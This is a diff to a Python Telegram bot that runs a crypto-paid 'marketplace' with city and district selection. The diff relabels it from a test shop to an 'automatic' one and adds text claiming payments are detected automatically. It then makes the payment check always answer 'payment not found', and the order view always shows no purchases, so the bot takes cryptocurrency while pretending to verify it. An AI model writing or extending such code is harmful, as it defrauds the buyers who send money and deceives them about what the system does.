@@ -167,15 +167,15 @@ async def choose_city_btn(m: types.Message):
 
 @dp.message(F.text == "📦 Мой заказ")
 async def my_order(m: types.Message):
-    await m.answer("📦 У вас пока нет активных заказов.")
+    await m.answer("📦 У вас ещё нет покупок, сначала произведите оплату.")
 
 @dp.message(F.text == "💰 Проверить оплату")
 async def check_payment_btn(m: types.Message):
-    await m.answer("💰 У вас нет неоплаченных заказов.")
+    await m.answer("💰 Отправьте боту в чат номер вашего заказа (только цифры). Внимание!!! Через 24 часа после покупки проверка заказа будет недоступна.")
 
 @dp.message(F.text == "ℹ️ О боте")
 async def about(m: types.Message):
-    await m.answer("🛒 Это тестовый маркетплейс.\nОплата в крипте.\nКошельки действительны 30 минут.")
+    await m.answer("🛒 Это автоматический маркетплейс.\nОплата только в криптовалюте.\nКошельки действительны 30 минут.")
 
 # =====================
 # INLINE HANDLERS
@@ -245,7 +245,7 @@ async def district_selected(c: types.CallbackQuery, state: FSMContext):
         f"🔹 BTC: <code>{btc}</code> → {BTC_WALLET}\n"
         f"🔹 USDT: <code>{usdt}</code> → {USDT_WALLET}\n"
         f"🔹 TON: <code>{ton}</code> → {TON_WALLET}\n\n"
-        f"⏰ Кошельки и сумма актуальны 30 минут"
+        f"⏰ Внимание!!! Для покупки товара, оплатите точную сумму на любой из этих кошельков. Бот находит оплату автоматически после первого подтверждения транзакции в сети. В целях идентификации платежа - кошельки и сумма актуальны 30 минут. Если у вас нет криптовалюты, её можно купить за рубли через обменник bestchange.biz , для создания кошельков используйте trust wallet, скачать можно через google play/app store."
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -263,7 +263,7 @@ async def reminder(user_id: int, order_id: int):
     try:
         await bot.send_message(
             user_id,
-            f"⏳ Заказ №{order_id}\n\nОсталось 10 минут до окончания брони кошельков!"
+            f"⏳ Заказ №{order_id}\n\nВаша бронь действительна ещё 10 минут."
         )
     except:
         pass
@@ -275,7 +275,7 @@ async def check_payment(c: types.CallbackQuery, state: FSMContext):
     if time.time() - data.get("t", 0) > 1800:  # 30 минут
         await c.answer("⛔ Время на оплату вышло (30 минут)", show_alert=True)
         return
-    await c.answer("✅ Оплата найдена! Товар в обработке.", show_alert=True)
+    await c.answer("⛔ Оплата не найдена, оплатите товар и повторите запрос.", show_alert=True)
 
 # =====================
 # RUN
